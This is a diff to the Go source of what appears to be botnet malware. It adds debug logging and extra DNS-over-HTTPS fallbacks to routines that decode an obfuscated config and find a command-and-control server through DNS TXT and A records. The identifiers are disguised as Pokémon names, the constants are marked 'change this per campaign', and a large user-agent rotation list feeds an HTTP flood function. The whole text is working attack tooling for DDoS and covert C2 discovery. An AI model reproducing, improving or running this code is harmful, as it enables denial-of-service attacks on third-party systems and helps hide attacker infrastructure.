@@ -32,9 +32,12 @@ import (
 
 //run setup.py dont try to change this yourself
 
+// Debug mode - set to true to see DNS resolution logs
+var debugMode = true
+
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "2i8nGWLfsdsdoKd8zvTgtEz3b" //change me run setup.py
-const cryptSeed = "20c091ad"                    //change me run setup.py
+const gothTits = "d3mVErbVNRsfff1Q/+twaQgBcQNODMUbks24bq/LbU4BUr" //change me run setup.py
+const cryptSeed = "7b32e8e1"                                        //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -121,8 +124,16 @@ func venusaur(encoded string) string {
 	return string(payload)
 }
 
+// debugLog => deoxys
+func deoxys(format string, args ...interface{}) {
+	if debugMode {
+		fmt.Printf("[DEBUG] "+format+"\n", args...)
+	}
+}
+
 // lookupTXTRecord => darkrai
 func darkrai(domain string) (string, error) {
+	deoxys("darkrai: Looking up TXT for domain: %s", domain)
 	servers := make([]string, len(lizardSquad))
 	copy(servers, lizardSquad)
 	rand.Shuffle(len(servers), func(i, j int) {
@@ -130,56 +141,168 @@ func darkrai(domain string) (string, error) {
 	})
 	var lastErr error
 	for _, server := range servers {
+		deoxys("darkrai: Trying DNS server: %s", server)
 		c := new(dns.Client)
 		c.Timeout = 5 * time.Second
+		c.Net = "udp"
 		m := new(dns.Msg)
 		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
 		m.RecursionDesired = true
-		r, _, err := c.Exchange(m, server)
+		r, rtt, err := c.Exchange(m, server)
 		if err != nil {
+			deoxys("darkrai: DNS error from %s: %v", server, err)
 			lastErr = err
 			continue
 		}
+		deoxys("darkrai: Got response from %s in %v, rcode=%d, answers=%d", server, rtt, r.Rcode, len(r.Answer))
 		if r.Rcode != dns.RcodeSuccess {
 			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
+			deoxys("darkrai: Bad rcode: %d", r.Rcode)
 			continue
 		}
 		for _, ans := range r.Answer {
+			deoxys("darkrai: Answer type: %T, value: %v", ans, ans)
 			if txt, ok := ans.(*dns.TXT); ok {
+				deoxys("darkrai: TXT record found with %d strings", len(txt.Txt))
 				for _, t := range txt.Txt {
+					deoxys("darkrai: TXT value: '%s'", t)
 					t = strings.TrimSpace(t)
 					if strings.HasPrefix(t, "c2=") {
-						return strings.TrimPrefix(t, "c2="), nil
+						result := strings.TrimPrefix(t, "c2=")
+						deoxys("darkrai: Found c2= prefix, returning: %s", result)
+						return result, nil
 					}
 					if strings.HasPrefix(t, "ip=") {
-						return strings.TrimPrefix(t, "ip="), nil
+						result := strings.TrimPrefix(t, "ip=")
+						deoxys("darkrai: Found ip= prefix, returning: %s", result)
+						return result, nil
 					}
+					// Try raw IP:port format
 					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
 						parts := strings.Split(t, ":")
 						if len(parts) == 2 {
 							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
+								deoxys("darkrai: Found raw IP:port, returning: %s", t)
 								return t, nil
 							}
 						}
+					}
+					// Try plain IP address (no port) - append default 443
+					if net.ParseIP(t) != nil {
+						result := t + ":443"
+						deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
+						return result, nil
 					}
 				}
 			}
 		}
 		lastErr = fmt.Errorf("no valid C2 address in TXT records")
+		deoxys("darkrai: No valid C2 found in TXT records from %s", server)
 	}
+	deoxys("darkrai: All servers failed, last error: %v", lastErr)
 	return "", lastErr
 }
 
 // lookupTXTviaDoH => palkia
 func palkia(domain string) (string, error) {
+	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
 	dohServers := []string{
-		"https://1.1.1.1/dns-query",
-		"https://8.8.8.8/dns-query",
+		"https://cloudflare-dns.com/dns-query",
+		"https://dns.google/dns-query",
+		"https://dns.quad9.net/dns-query",
+	}
+	for _, server := range dohServers {
+		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
+		deoxys("palkia: Trying DoH server: %s", dohURL)
+		req, err := http.NewRequest("GET", dohURL, nil)
+		if err != nil {
+			deoxys("palkia: Request create error: %v", err)
+			continue
+		}
+		req.Header.Set("Accept", "application/dns-json")
+		client := &http.Client{Timeout: 10 * time.Second}
+		resp, err := client.Do(req)
+		if err != nil {
+			deoxys("palkia: Request error: %v", err)
+			continue
+		}
+		deoxys("palkia: Got response status: %d", resp.StatusCode)
+		if resp.StatusCode != http.StatusOK {
+			resp.Body.Close()
+			continue
+		}
+		var dnsResp struct {
+			Status int `json:"Status"`
+			Answer []struct {
+				Type int    `json:"type"`
+				Data string `json:"data"`
+			} `json:"Answer"`
+		}
+		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
+			deoxys("palkia: JSON decode error: %v", err)
+			resp.Body.Close()
+			continue
+		}
+		resp.Body.Close()
+		deoxys("palkia: DNS status=%d, answers=%d", dnsResp.Status, len(dnsResp.Answer))
+		for _, ans := range dnsResp.Answer {
+			deoxys("palkia: Answer type=%d data='%s'", ans.Type, ans.Data)
+			// TXT records are type 16
+			if ans.Type != 16 {
+				continue
+			}
+			data := strings.Trim(ans.Data, "\"")
+			data = strings.TrimSpace(data)
+			deoxys("palkia: Parsed TXT data: '%s'", data)
+			if strings.HasPrefix(data, "c2=") {
+				result := strings.TrimPrefix(data, "c2=")
+				deoxys("palkia: Found c2=, returning: %s", result)
+				return result, nil
+			}
+			if strings.HasPrefix(data, "ip=") {
+				result := strings.TrimPrefix(data, "ip=")
+				deoxys("palkia: Found ip=, returning: %s", result)
+				return result, nil
+			}
+			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
+				parts := strings.Split(data, ":")
+				if len(parts) == 2 {
+					deoxys("palkia: Found raw IP:port, returning: %s", data)
+					return data, nil
+				}
+			}
+			// Try plain IP address (no port) - append default 443
+			if net.ParseIP(data) != nil {
+				result := data + ":443"
+				deoxys("palkia: Found plain IP, appending :443, returning: %s", result)
+				return result, nil
+			}
+		}
+	}
+	deoxys("palkia: All DoH servers failed")
+	return "", fmt.Errorf("DoH TXT lookup failed")
+}
+
+// lookupARecord => rayquaza - Fallback to A record lookup
+func rayquaza(domain string) (string, error) {
+	deoxys("rayquaza: A record fallback for: %s", domain)
+	// Try system resolver first
+	ips, err := net.LookupHost(domain)
+	if err == nil && len(ips) > 0 {
+		deoxys("rayquaza: System resolver returned: %s", ips[0])
+		return ips[0], nil
+	}
+	deoxys("rayquaza: System resolver failed: %v, trying DoH", err)
+
+	// Fallback to DoH A record
+	dohServers := []string{
+		"https://cloudflare-dns.com/dns-query",
 		"https://dns.google/dns-query",
 	}
 	for _, server := range dohServers {
-		url := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
-		req, err := http.NewRequest("GET", url, nil)
+		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
+		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
+		req, err := http.NewRequest("GET", dohURL, nil)
 		if err != nil {
 			continue
 		}
@@ -187,38 +310,33 @@ func palkia(domain string) (string, error) {
 		client := &http.Client{Timeout: 10 * time.Second}
 		resp, err := client.Do(req)
 		if err != nil {
+			deoxys("rayquaza: DoH error: %v", err)
 			continue
 		}
-		defer resp.Body.Close()
 		if resp.StatusCode != http.StatusOK {
+			resp.Body.Close()
 			continue
 		}
 		var dnsResp struct {
 			Answer []struct {
+				Type int    `json:"type"`
 				Data string `json:"data"`
 			} `json:"Answer"`
 		}
 		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
+			resp.Body.Close()
 			continue
 		}
+		resp.Body.Close()
 		for _, ans := range dnsResp.Answer {
-			data := strings.Trim(ans.Data, "\"")
-			data = strings.TrimSpace(data)
-			if strings.HasPrefix(data, "c2=") {
-				return strings.TrimPrefix(data, "c2="), nil
-			}
-			if strings.HasPrefix(data, "ip=") {
-				return strings.TrimPrefix(data, "ip="), nil
-			}
-			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
-				parts := strings.Split(data, ":")
-				if len(parts) == 2 {
-					return data, nil
-				}
+			// A records are type 1
+			if ans.Type == 1 {
+				deoxys("rayquaza: Found A record: %s", ans.Data)
+				return ans.Data, nil
 			}
 		}
 	}
-	return "", fmt.Errorf("DoH TXT lookup failed")
+	return "", fmt.Errorf("A record lookup failed")
 }
 
 // isValidHostname => arceus
@@ -237,16 +355,22 @@ func arceus(h string) bool {
 
 // requestMore => dialga
 func dialga() string {
+	deoxys("dialga: Starting C2 resolution")
 	decoded := venusaur(gothTits)
+	deoxys("dialga: Decoded config: '%s'", decoded)
 	if decoded == "" {
+		deoxys("dialga: Failed to decode config, returning empty")
 		return ""
 	}
+	// Check if already IP:port format
 	if strings.Contains(decoded, ":") {
 		parts := strings.Split(decoded, ":")
 		if len(parts) == 2 && net.ParseIP(parts[0]) != nil {
+			deoxys("dialga: Config is already IP:port format: %s", decoded)
 			return decoded
 		}
 	}
+	// Extract domain and port
 	domain := decoded
 	defaultPort := "443"
 	if strings.Contains(domain, ":") {
@@ -256,22 +380,38 @@ func dialga() string {
 			defaultPort = parts[1]
 		}
 	}
+	deoxys("dialga: Domain=%s, Port=%s", domain, defaultPort)
+
+	// Method 1: DNS TXT record lookup
+	deoxys("dialga: Trying TXT record lookup via UDP DNS")
 	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
+		deoxys("dialga: TXT lookup success: %s", c2Addr)
 		return c2Addr
 	}
+
+	// Method 2: DoH TXT record lookup
+	deoxys("dialga: Trying TXT record lookup via DoH")
 	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
+		deoxys("dialga: DoH TXT lookup success: %s", c2Addr)
 		return c2Addr
 	}
-	ips, err := net.LookupHost(domain)
-	if err == nil && len(ips) > 0 {
-		return fmt.Sprintf("%s:%s", ips[0], defaultPort)
+
+	// Method 3: Fallback to A record (domain points directly to C2)
+	deoxys("dialga: TXT lookups failed, falling back to A record")
+	if ip, err := rayquaza(domain); err == nil && ip != "" {
+		result := fmt.Sprintf("%s:%s", ip, defaultPort)
+		deoxys("dialga: A record fallback success: %s", result)
+		return result
 	}
+
+	// Last resort: return decoded value as-is
+	deoxys("dialga: All resolution methods failed, returning decoded: %s", decoded)
 	return decoded
 }
 
 const (
-	magicCode       = "E68dPGaHs*0iaYeS" //change this per campaign
-	protocolVersion = "V5_4"             //change this per campaign
+	magicCode       = "saj95sciW1zQSXD9" //change this per campaign
+	protocolVersion = "r2.7-stable"      //change this per campaign
 )
 
 var (
@@ -915,6 +1055,73 @@ var eevee = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
+	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
+	"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
+	"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
+	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
+	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+	"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
+	"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+	"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
+	"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
+	"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
+	"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
+	"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
+	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
+	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
+	"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
+	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
 }
 
 // performHTTPFlood => alakazam
